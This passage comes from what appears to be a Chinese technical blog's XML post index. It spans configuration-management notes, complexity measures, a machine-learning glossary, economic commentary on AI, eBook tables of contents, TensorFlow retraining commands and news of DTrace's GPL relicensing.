文件$ ansible all -m shell -a "hostname" --ask-pass -i /yourdir/ansible_hosts# 或者通过环境变量指定$ export ANSIBLE_HOSTS=~/ansible_hosts$ echo "127.0.0.1" &gt; ~/ansible_hosts Puppet Arch: Agent/Server develop language: Ruby enterprise &amp; community edition Puppet ABCWordBookYAMLYAML 语言（发音 /ˈjæməl/ ）实质上是一种通用的数据串行化格式。基本语法规则如下: 大小写敏感 使用缩进表示层级关系 缩进时不允许使用Tab键，只允许使用空格。 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可 # 表示行注释 YAML 支持的数据结构： 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary） 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list） 纯量（scalars）：单个的、不可再分的值 YAML 语言教程 DSL|Domain Specific Language,领域专用语言DSL的目标受众是非程序员，业务员或者最终用户。DSL 最大的设计原则就是简单，通过简化语言中的元素，降低使用者的负担；无论是 Regex、SQL 还是 HTML 以及 CSS，其说明文档往往只有几页，非常易于学习和掌握。但是，由此带来的问题就是，DSL 中缺乏抽象的概念，比如：模块化、变量以及方法等。 领域专用语言(DSL)迷思 谈谈 DSL 以及 DSL 的应用（以 CocoaPods 为例） 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 Deployment Management Tools: Chef vs. Puppet vs. Ansible vs. SaltStack vs. Fabric SaltStack 与 Ansible 选择？| zhihu.com 中国SaltStack用户组|China SaltStack User Group 基于Salt管理iptables防火墙规则 Ansible ：一个配置管理和IT自动化工具 自动化运维工具 SaltStack 在云计算环境中的实践]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数学常识|如何度量复杂性]]></title>
    <url>%2F2018%2F03%2F25%2FMathmetics-Complexity%2F</url>
    <content type="text"><![CDATA[摘要 复杂系统、复杂度(Complexity) 如何度量复杂度：熵、算法信息量、逻辑深度、热力学深度、计算能力、层次性 如何度量复杂度2001 年，物理学家劳埃德（Seth Lloyd）发表了一篇文章（《Measures of complexity：A non-exhaustive list. IEEE Control Systems Magazine, August 2001 》），分别从动力学、热力学、信息论等方面列出了 40 种度量复杂性的方法。提出了度量一个事物或过程的复杂性的三个维度： 描述它有多困难 ？ 产生它有多困难 ？ 其组织程度如何 ？ 用熵度量复杂性香农熵，相对于信息接收者的平均信息量或“惊奇度”。例如，假设消息由符号 A、C、G 和 T 组成。如果序列高度有序，如“A A A A A A …… A ” 则熵为零。完全随机的序列则有最大可能熵。最复杂的对象不是最有序的或最随机的，而是介于两者之间。 在英语里，信息和情报是同一个词（Information），而我们知道情报的作用就是排除不确定性。 如果没有信息，任何公式或者数字的游戏都无法排除不确定性。这个朴素的结论非常重要，但是在研究工作中经常被一些半瓶子醋的专家忽视，希望做这方面工作的读者谨记。(吴军 |《数学之美》) 用香农熵度量复杂性的问题。首先，所针对的对象或过程需要转换成某种“消息”的形式，这并不总是那么容易做到。另外，随机消息的熵最高，但是那些最复杂的对象都不是完全随机的。例如变形虫的基因长度远远超过其他动植物，具备复杂功能的人类基因也不是随机的，甚至能看到长期历史演化出来的规律。 用算法信息量度量复杂性为了改进熵度量复杂性的方法，1997 年柯尔莫哥洛夫（Andrey Kolmogorov）等人提出了算法信息量的概念。他们将事物的复杂度定义为能够产生对事物完整描述的最短计算机程序的长度。 为了计算有效复杂性，首先要给出事物规则性的最佳描述；有效复杂性定义为包含在描述中的信息量或规则集合的算法信息量。事物的结构可预测性越大，有效复杂性就越低。 对于一个事物的各种规则集，如何决定哪个是最好的呢？奥卡姆剃刀（Occam’s Razor, Ockham’s Razor），意思是简约之法则。最好的规则集是能够描述事物的最小规则集，同时还能将事物的随机成分最小化。奥卡姆剃刀在现代医学中的应用最具代表性，医生和医学哲学家提出了 症状化约原则（diagnostic parsimony）。即在诊断某个病症时，医生应该尽量寻找会导致所有症状的最简单可能性。“当你听到背后有蹄声时，应该想到马而不是斑马。” 虽然症状化约原则常常可能是正确的，然而也有争锋相对的意见：西卡姆格言（Hickam’s dictum），“病人乐意得多少种病就能得多少种病。” 从统计数据看，一个病人的多种症状往往会归于多种常见疾病，而不是仅仅一种。另外，排除统计的因素，有许多病人无法使用单一疾病来解释众多的症状，被证实患有多种疾病。实际上，医生很难根据一个症状来判断是或者不是某个疾病，而是不断地根据病人的生活环境、日常习惯、用药史等等来建立、测试和修改对于症状的假设才是更好的方法。 用逻辑深度度量复杂性为了更加接近我们对复杂性的直觉，数学家班尼特在 20 世纪 80 年代初提出了 逻辑深度（logical depth） 的概念。 用班尼特的话说，“有逻辑深度的事物从根本上必须是长时间计算或漫长动力过程的产物，否则就不可能产生。” 或是像劳埃德说的，“用最合理的方法生成某个事物时需要处理的信息量等同于这个事物的复杂性，这是一个很吸引人的想法。” 用热力学深度度量复杂性20 世纪 80 年代末，劳埃德和裴杰斯（Heinz Pagels）提出了一种复杂性度量方法：热力学深度（thermodynamic depth）。 与图灵机生成对事物的描述所需的时间步不同，热力学深度首先是确定“产生出这个事物最科学合理的确定事件序列”，然后测量“物理构造过程所需的热力源和信息源的总量”。例如，要确定人类基因组的热力学深度，得从最早出现的第一个生物的基因组开始，列出直到现代人类出现的所有遗传演化事件（随机变异、重组、基因复制等）。 问题：如何定义系统的状态粒度，在列出事件时，如何确定相关的宏观状态。 用计算能力度量复杂性一种观点认为，系统的计算能力如果等价于通用图灵机的计算能力，就是复杂系统。不过，班尼特等人则认为，具有执行通用计算的能力并不意味着系统本身就是复杂的；应当测量的是系统处理输入时的行为的复杂性。 用层次性度量复杂性如何用层次（degree of hierarchy）来刻画一个系统的复杂性：复杂系统由子系统组成，子系统下面又有子系统，不断往下。（《复杂性的结构》：The architecture of complexity. Simon 1962） 西蒙认为，复杂系统最重要的共性就是 层次性 和 不可分解性。在层次性复杂系统中，子系统内部的紧密相互作用比子系统之间要多得多。例如，细胞内部的新陈代谢网络就比细胞之间的作用要复杂得多。 总结各种度量复杂性的方法都抓住了一些方面，但都存在理论上和实践上的局限性，还远不能有效刻画实际系统的复杂性，度量方法的多样性也表明复杂系统具有许多维度，无法用单一的尺度来刻画。 扩展阅读 Machine Learning:机器学习算法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 Why draw when you can code? Graphviz 简介 最佳 Graphviz 实践：流程图、数据结构图、网络路径 Trace Route、复杂社会关系链分析、机器学习算法-决策树(Decision Tree) 参考文献 2001 劳埃德（Seth Lloyd）《Measures of complexity：A non-exhaustive list. IEEE Control Systems Magazine, August 2001 》 1962 Simon《复杂性的结构》：The architecture of complexity. 如何测出一句话中的信息量]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
        <tag>科技史</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:WordBook]]></title>
    <url>%2F2018%2F03%2F21%2FMachine-Learning-WordBook%2F</url>
    <content type="text"><![CDATA[摘要 Basic数学概念 泰勒级数 Taylor series 用无限项连加式——级数来表示一个函数，这些相加的项由函数在某一点的导数求得，以 1715 年发表了泰勒公式的英国数学家布鲁克·泰勒（Sir Brook Taylor）来命名。通过函数在自变量零点的导数求得的泰勒级数又叫做麦克劳林级数，以苏格兰数学家科林·麦克劳林的名字命名。 导数 Derivative 导数（Derivative）是微积分学中重要的基础概念。一个函数在某一点的导数描述了这个函数在这一点附近的变化率。导数的本质是通过极限的概念对函数进行局部的线性逼近。 偏导数 Partial Derivatives 在数学中，一个多变量的函数的偏导数是它关于其中一个变量的导数，而保持其他变量恒定（相对于全导数，在其中所有变量都允许变化） 超参数 Hyper Parameter 在机器学习中，超参数是在学习过程开始之前设置的一个参数。相比之下，其他参数的值是通过训练得到的。 不同的模型训练算法需要不同的超参数，一些简单的算法（如普通最小二乘回归）不需要。给定这些超参数，训练算法从数据中学习参数。例如，LASSO 是一种算法，将正则化超参数添加到普通最小二乘回归中，它必须在通过训练算法估计参数之前设置。在深度学习中，常见的超参数有：学习速率，迭代次数，层数，每层神经元的个数等。 激活函数 Activation Function 在 计算网络中， 一个节点的激活函数定义了该节点在给定的输入或输入的集合下的输出 Deep LearningNeural Network 神经网络（Neural Network，缩写 NN） 人工神经网络（Artificial Neural Network，缩写 ANN） 人工神经网络（Artificial neural network，缩写ANN），简称神经网络（neural network，缩写NN）或类神经网络，是一种模仿生物神经网络(动物的中枢神经系统，特别是大脑)的结构和功能的数学模型或计算模型。神经网络由大量的人工神经元联结进行计算。大多数情况下人工神经网络能在外界信息的基础上改变内部结构，是一种自适应系统。现代神经网络是一种非线性统计性数据建模工具，常用来对输入和输出间复杂的关系进行建模，或用来探索数据的模式。 Convolutional Neural Network 卷积神经网络(Convolutional Neural Network,缩写 CNN )In machine learning, a convolutional neural network (CNN, or ConvNet) is a type of feed-forward artificial neural network in which the connectivity pattern between its neurons is inspired by the organization of the animal visual cortex, whose individual neurons are arranged in such a way that they respond to overlapping regions tiling the visual field. Convolutional networks were inspired by biological processes and are variations of multilayer perceptrons designed to use minimal amounts of preprocessing. They have wide applications in image and video recognition, recommender systems and natural language processing. RNN RNN 一般指代时间递归神经网络(Recurrent Neural Network) 结构递归神经网络(Recursive Neural Network) A recurrent neural network (RNN) is a class of artificial neural network where connections between units form a directed cycle. This creates an internal state of the network which allows it to exhibit dynamic temporal behavior. Unlike feedforward neural networks, RNNs can use their internal memory to process arbitrary sequences of inputs. This makes them applicable to tasks such as unsegmented connected handwriting recognition or speech recognition. 递归神经网络（RNN）是两种人工神经网络的总称。时间递归神经网络的神经元间连接构成有向图，而结构递归神经网络利用相似的神经网络结构递归构造更为复杂的深度网络。单纯递归神经网络因为无法处理随着递归，权重指数级爆炸或消失的问题（Vanishing gradient problem），难以捕捉长期时间关联；而结合不同的LSTM可以很好解决这个问题。 GANGenerative Adversarial Network，生成对抗网络非监督式学习的一种方法，通过让两个神经网络相互博弈的方式进行学习。该方法由伊恩·古德费洛等人于2014年提出） Autoencoders 自动编码Reinforcement Learning 强化学习Reinforcement learning is an area of machine learning inspired by behaviorist psychology, concerned with how software agents ought to take actions in an environment so as to maximize some notion of cumulative reward. The problem, due to its generality, is studied in many other disciplines, such as game theory, control theory, operations research, information theory, simulation-based optimization, multi-agent systems, swarm intelligence, statistics, and genetic algorithms. In the operations research and control literature, the field where reinforcement learning methods are studied is called approximate dynamic programming. The problem has been studied in the theory of optimal control, though most studies are concerned with the existence of optimal solutions and their characterization, and not with the learning or approximation aspects. In economics and game theory, reinforcement learning may be used to explain how equilibrium may arise under bounded rationality. 强化学习是机器学习中的一个领域，强调如何基于环境而行动，以取得最大化的预期利益。其灵感来源于心理学中的行为主义理论，即有机体如何在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。这个方法具有普适性，因此在其他许多领域都有研究，例如博弈论、控制论、运筹学、信息论、模拟优化方法、多主体系统学习、群体智能、统计学以及遗传算法。在运筹学和控制理论研究的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。在最优控制理论中也有研究这个问题，虽然大部分的研究是关于最优解的存在和特性，并非是学习或者近似方面。在经济学和博弈论中，强化学习被用来解释在有限理性的条件下如何出现平衡。 Open Source LibraryTensorFlowTensorFlow is an open source software library for machine learning in various kinds of perceptual and language understanding tasks. It is a second-generation API which is currently used for both research and production by 50 different teams in dozens of commercial Google products, such as speech recognition, Gmail, Google Photos, and Search. These teams had previously used DistBelief, a first-generation API. TensorFlow was originally developed by the Google Brain team for Google’s research and production purposes and later released under the Apache 2.0 open source license on November 9, 2015. Scikit-Learn 机器学习算法库Scikit-Learn(formerly scikits.learn) is a free software machine learning library for the Python programming language. It features various classification, regression and clustering algorithms including support vector machines, random forests, gradient boosting, k-means and DBSCAN, and is designed to interoperate with the Python numerical and scientific libraries NumPy and SciPy. COCO SSDOk that worked pretty well, but how do we deal with images that show multiple objects. Well to recognize multiple objects in a single image, we will utilize what’s called a Single Shot Multibox Detector (SSD). In our second example we will look at a SSD model trained with the COCO (Common Object in Context) dataset. The model we are using has been trained on 84 different classes. 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图]]></content>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-Learning-TensorFlow-ProtoBuf]]></title>
    <url>%2F2018%2F03%2F20%2FMachine-Learning-TensorFlow-ProtoBuf%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 簡介 Google Protocol Buffer Tensorflow框架实现中的“三”种图 Tensorflow将模型导出为一个文件及接口设置 How to use Dataset in TensorFlow| The built-in Input Pipeline. Never use ‘feed-dict’ anymore Deploy TensorFlow models | Super fast and concise tutorial]]></content>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:经济学家谈人工智能]]></title>
    <url>%2F2018%2F03%2F09%2FMachine-Learning-Economist%2F</url>
    <content type="text"><![CDATA[摘要 为什么人工智能的繁荣没有提高生产率 Artificial Intelligence is a General Purpose Technology Measuring AI Capital Previous Posts Machine Learning:人工智能媒体报道集 媒体报道|经济学人：译者的悲伤 | 20170527 媒体报道|经济学人：计算机如何学习人类语言？| 20170111 为什么人工智能的繁荣没有提高生产率人工智能技术的进步无处不在，从自动驾驶汽车到机器人助理到高级语音识别。到处都是，除了生产力统计数据。这种情况看起来像是索洛悖论（Solow Paradox，又称 Productivity Paradox 生产率悖论）的重演，1987 年由麻省理工学院（ MIT，Massachusetts Institute of Technology）经济学家和诺贝尔奖得主罗伯特·索洛所阐述的理论。最近一项研究认为索洛悖论的罪魁祸首可能是实施新技术的滞后，研究人员包括 MIT 斯隆管理学院的教授 Erik Brynjolfsson，MIT 博士生 Daniel Rock 和芝加哥大学布斯商学院（University of Chicago Booth School of Business）的经济学教授 Chad Syverson。 根据市场调研公司 CB Insights 的数据，尽管以科技为中心的纳斯达克综合指数（Nasdaq Composite Index）从 2012 年到 2017 年翻了一番，与人工智能相关的技术投资在 2016 年激增了八倍以上、超过 50 亿美元。但这些并没有促进劳动生产率（labor-productivity）的增长，2005 年到 2017 年的增长率还不到 1995 年至 2004 年年均增长率（3％）的一半。 尽管如此，研究人员认为依然有理由持乐观态度，他们认为新技术需要时间在整个经济中传播和实施。他们引用了蒸汽机，电力和内燃机的案例，这些发明都是通过几年和几十年的时间才发挥变革性影响。因为这些技术的广泛应用还需要其他配套技术创新。研究人员指出，交流电安全实用三十年后，至少有一半的美国制造商还没有通电，因为制造商还没有弄清楚如何基于小型电动机重组生产过程。研究人员说这并不罕见; 企业几乎总是花费更多的精力来重新设计业务流程和培训人员，而不是为自己购买新技术。 Artificial Intelligence is a General Purpose Technology As important as specific applications of AI may be, we argue that the more important economic effects of AI, machine learning, and associated new technologies stem from the fact that they embody the characteristics of general purpose technologies (GPTs). 例如，机器学习系统（machine learning system）已经将机器的能力转化为执行许多基本的知觉类型，以实现更广泛的应用。机器视觉 – 查看和识别物体的能力，在照片中标记它们，并解读视频流。识别错误率地改善，从1/30(帧) 提高到 1/30万(帧)，自动驾驶汽车越来越具有可行性。 Measuring AI Capital研究人员提出人工智能应视为新的资本形式，确切说是一种无形资本，这种资本会随着投资的增加而累积，会对生产率持续产生作用，其价值会发生折旧（随着时间流逝而贬值）。 引入人工智能技术而产生的成本、组织变革、新技能等因素需要纳入到无形资本的框架当中并构建新的预测模型（J-Curve），随后的实证研究表明，新的模型可以更好地反映技术对生产率增长的影响作用。 人工智能的影响评估结果取决于各国统计方案中如何衡量人工智能资本（AI ）。人工智能资本计量的主要困难在于其许多产出将是无形的。人工智能大量使用在财务上体现作为其他资本的投入，包括新型软件，以及人力和组织资本，而不是最终消费品。包括人力资本在内的其他大部分资本，与 AI 本身一样，大部分都是无形的。 更具体地说，有效使用人工智能需要开发数据集，建立企业的专业人力资本，并实施新的业务流程。这些都需要大量的资本支出和维护。在古典增长核算模型中，这些无形支出的有形对应物（包括计算资源，服务器和房地产的购买）很容易衡量。另一方面，与之配套的生产投资价值则很难量化。在购买资本资产后，企业还会产生额外的调整成本（adjustment costs）。例如，业务流程重新设计和安装成本。 Much of the market value of AI capital specifically and IT capital more generally may be derived from the capitalized short-term quasi-rents earned by firms that have already reorganized to extract service flows from new investment. 人工智能悖论与世界的变化是一致的。研究人员考虑了悖论的其他可能原因，其中包括对 AI 的盲目乐观，生产力效益正在发生但被误判，新技术的收益存在但仅限于一小部分工人，给出的解释是实现延迟（here’s an implementation delay）。他们写道：“这种看似悖论的两半都是正确的”。在这个观点中，预示着随着应用的扩展，人工智能技术突破对生产力的影响将越来越大。人工智能投资成本高昂，需要配套设施的发展，需要时间和资源来实施。 背景知识：索洛悖论20世纪80年代末，美国学者查斯曼(Strassman)调查了292个企业，结果发现这些企业的IT投资和投资回报率(ROI)之间没有明显的关联。 1987 年获得诺贝尔奖的经济学家罗伯特·索洛(Robert Solow)将这种现象称为“生产率悖论”(Productivity Paradox)：“我们到处都看得见计算机，就是在生产率统计方面却看不见计算机（Computers everywhere except in the productivity statistics.）”。 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 Artificial Intelligence and the Modern Productivity Paradox: A Clash of Expectations and Statistics why-ai-boom-isn-t-boosting-productivity 论文代写了解一下：要价63000美元的枪手论文是如何产生的？]]></content>
      <tags>
        <tag>Science</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-Learning-Keras]]></title>
    <url>%2F2018%2F03%2F07%2FMachine-Learning-Keras%2F</url>
    <content type="text"><![CDATA[摘要 资源 A neural network that transforms a screenshot into a static website 参考文献 Prophecy Fulfilled: Keras and Cloudera Data Science Workbench]]></content>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-Learning-NLP]]></title>
    <url>%2F2018%2F03%2F07%2FMachine-Learning-NLP%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 How to solve 90% of NLP problems: a step-by-step guide | Using Machine Learning to understand and leverage text Robbie Allen:Learning Machine Learning and NLP from 187 Quora Questions Google神经机器翻译系统实现Zero-Shot翻译]]></content>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《数据可视化》]]></title>
    <url>%2F2018%2F03%2F02%2FeBook-DVM%2F</url>
    <content type="text"><![CDATA[摘要https://legacy.gitbook.com/book/riboseyim/ebook-data-visualization-master 简介https://legacy.gitbook.com/book/riboseyim/ebook-data-visualization-master 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.1]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>最佳写作实践</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《The Cyber-Security Master》]]></title>
    <url>%2F2018%2F03%2F02%2FeBook-CSM%2F</url>
    <content type="text"><![CDATA[摘要https://www.gitbook.com/book/riboseyim/cyber-security-manual 简介目录 Chapter 1: 网络监控技术 性能优化思路：从珠海航展交通管控实践谈起 新一代Ntopng网络流量监控—可视化和架构分析 基于数据分析的网络态势感知 网络数据包的捕获、过滤和分析 Chapter 2: 网络安全技术 警惕 Wi-Fi 漏洞，争取安全上网 Web应用安全：攻击、防护和检测 IPv6 网络协议与网络安全 OpenSSH 并不安全 Linux/XOR.DDoS 木马样本分析 Chapter 3: 网络安全治理 事与愿违的后门程序 美国网络安全立法策略 香港警务处网络安全与科技罪案调查科 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.1]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>SRE</tag>
        <tag>最佳写作实践</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《Machine Learning Master》]]></title>
    <url>%2F2018%2F03%2F02%2FeBook-MLM%2F</url>
    <content type="text"><![CDATA[摘要 《The Machine Learning Master | 机器学习专家》 简介目录 Chapter 1: 机器学习导论 神经网络基础 机器学习项目 Top 30 Chapter 2: 机器学习算法 机器学习算法 Top 10 如何选择机器学习算法 Chapter 3: 机器学习应用开发 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Chapter N: 人工智能与社会 经济学家谈人工智能 经济学人：计算机如何学习人类语言？ 经济学人：译者为何忧虑？ 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.1 20180508 调整章节结构 add 神经网络基础 add 如何选择机器学习算法 add 经济学家谈人工智能 Edition 0.1 201803 Chapter 1: 机器学习导论 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js 机器学习算法 Top 10 机器学习项目 Top 30 Chapter N: 媒体报道集 经济学人：计算机如何学习人类语言？ 经济学人：译者为何忧虑？]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
        <tag>最佳写作实践</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:Training Models]]></title>
    <url>%2F2018%2F02%2F27%2FMachine-Learning-TrainModel%2F</url>
    <content type="text"><![CDATA[摘要 Previous前文回顾： Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js 上面的文章中提到了机器学习的预测结果受模型质量的影响很大，如果想要取得好的效果需要通过训练增强优化。 Training Data1curl http://download.tensorflow.org/example_images/flower_photos.tgz \| tar xz -C tf_files Training the Network1git clone https://github.com/googlecodelabs/tensorflow-for-poets-2 1234python scripts/retrain.py--image_dir=tf_files/flower_photos--output_graph=tf_files/retrained_graph.pb--output_labels=tf_files/retrained_labels.txt Test:Using the Retrained Model1python scripts/label_image.py --image data/daisy.jpg Model123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293node &#123; name: "DecodeJpeg/contents" op: "Const" attr &#123; key: "dtype" value &#123; type: DT_STRING &#125; &#125; attr &#123; key: "value" value &#123; tensor &#123; dtype: DT_STRING tensor_shape &#123; &#125; string_val: "\377\330......."&#125;&#125;&#125;&#125;node &#123;name: "softmax/biases"op: "Const"attr &#123;key: "dtype"value &#123;type: DT_FLOAT&#125;&#125;attr &#123;key: "value"value &#123;tensor &#123; dtype: DT_FLOAT tensor_shape &#123; dim &#123; size: 1008 &#125; &#125; tensor_content: "\312\277\006"&#125;&#125;&#125;&#125;node &#123;name: "softmax/logits/MatMul"op: "MatMul"input: "pool_3/_reshape"input: "softmax/weights"attr &#123;key: "T"value &#123;type: DT_FLOAT&#125;&#125;attr &#123;key: "transpose_a"value &#123;b: false&#125;&#125;attr &#123;key: "transpose_b"value &#123;b: false&#125;&#125;&#125;node &#123;name: "softmax/logits"op: "BiasAdd"input: "softmax/logits/MatMul"input: "softmax/biases"attr &#123;key: "T"value &#123;type: DT_FLOAT&#125;&#125;&#125;node &#123;name: "softmax"op: "Softmax"input: "softmax/logits"attr &#123;key: "T"value &#123;type: DT_FLOAT&#125;&#125;&#125; Optional ParametersQuestions123422:17:28.523085: W tensorflow/core/platform/cpu_feature_guard.cc:45] The TensorFlow library wasn&apos;t compiled to use FMA instructions, but these are available on your machine and could speed up CPU computations.22:17:28 NodeDef mentions attr &apos;dilations&apos; not in Op&lt;name=Conv2D; signature=input:T, filter:T -&gt; output:T; attr=T:type,allowed=[DT_HALF, DT_FLOAT]; attr=strides:list(int); attr=use_cudnn_on_gpu:bool,default=true; attr=padding:string,allowed=[&quot;SAME&quot;, &quot;VALID&quot;]; attr=data_format:string,default=&quot;NHWC&quot;,allowed=[&quot;NHWC&quot;, &quot;NCHW&quot;]&gt;; NodeDef: conv/Conv2D = Conv2D[T=DT_FLOAT, data_format=&quot;NHWC&quot;, dilations=[1, 1, 1, 1], padding=&quot;VALID&quot;, strides=[1, 2, 2, 1], use_cudnn_on_gpu=true](Mul, conv/conv2d_params). (Check whether your GraphDef-interpreting binary is up to date with your GraphDef-generating binary.).22:22:02.629987: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.2 AVX AVX2 FMA About Data Sets Fun with small image data-sets (Part 2) 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 综述论文：机器学习中的模型评价、模型选择与算法选择 | 2018-02-02 机器之心 Plug &amp; Play Machine Learning Models in GoLang | BAYESIAN CLASSIFICATION Train Your Machine Learning Models on Google’s GPUs for Free — Forever How do we ‘train’ neural networks ?]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术(五)：DTrace for Linux]]></title>
    <url>%2F2018%2F02%2F16%2FDTrace-Linux%2F</url>
    <content type="text"><![CDATA[摘要 里程碑：DTrace 从 CDDL 切换为 GPL 许可证 里程碑：Linux 合并 BPF 里程碑：DTrace 切换到 GPL 许可证News:dtrace dropped the CDDL and switched to the GPL!根据 2月14日 Brendan Gregg 在 Twitter 上推送的消息：Oracle 已经将 DTrace 模块的开源许可证从 CDDL 切换到 GPL，预计最快到 2018 年底 Linux kernel 就可以发布一个可用的 /usr/sbin/dtrace ，底层基于 bcc 和 eBPF 。 Good news from Oracle: DTrace is GPL’d (thank you!). I’d guess by the end of 2018 we’ll have a working /usr/sbin/dtrace on Linux for running D scripts (using libbcc+eBPF on the backend) 关于动态追踪技术（Dynamic Tracing），我们在之前的文章已经有所介绍，动态追踪技术(一)：DTrace 导论 。DTrace 是动态追踪技术的鼻祖，源自 Solaris 操作系统，提供了高级性能分析和调试功能（ advanced performance analysis and troubleshooting tool ）。 Oracle 收购 SUN 公司之后推出了 Oracle Linux DTrace （基于 Oracle 企业级内核 Unbreakable Enterprise Kernel ，UEK)，针对性地发展完善了一系列探针如 syscall, profile, sdt, proc, sched 和 USDT，受制于诸多原因一直没有进入 Linux kernel 代码树，其中最大的一个障碍是许可授权问题：DTrace 源代码采用 CDDL 许可证，不兼容 Linux kernel 使用的 GPLv2 许可证，无法直接移植。 123456789commit e1744f50ee9bc1978d41db7cc93bcf30687853e6Author: Tomas Jedlicka &lt;tomas.jedlicka@oracle.com&gt;Date: Tue Aug 1 09:15:44 2017 -0400dtrace: Integrate DTrace Modules into kernel properThis changeset integrates DTrace module sources into the main kernelsource tree under the GPLv2 license. Sources have been moved toappropriate locations in the kernel tree. CDDL vs GPLDTrace 与 OpenSolaris 一样之前是基于 CDDL 许可证而不是 Linux kernel 使用的 GPL 许可证，二者的区别是什么呢？ GNU通用公共许可协议（GNU General Public License，简称 GNU GPL、GPL，港台地区翻译为“GNU通用公共授权条款”）是广泛使用的免费软件许可证，最初由GNU项目的自由软件基金会（FSF）的理查德·斯托曼（Richard Matthew Stallman）撰写。 一般的版权概念（“copyright”），从不授予用户任何权利（除了使用的权利），更多的是限制性规定，例如复制、修改、分发等，也可以包括一些法律允许的行为，比如逆向工程。GPL 则代表了知识产权制度的左翼阵营（“copyleft”），它授予被许可人以下权利（或称“自由”）： 以任何目的运行此程序的自由； 再复制的自由； 修改程序并公开发布改进版的自由（前提是能得到源代码）。 GPL 及其它 Copyleft 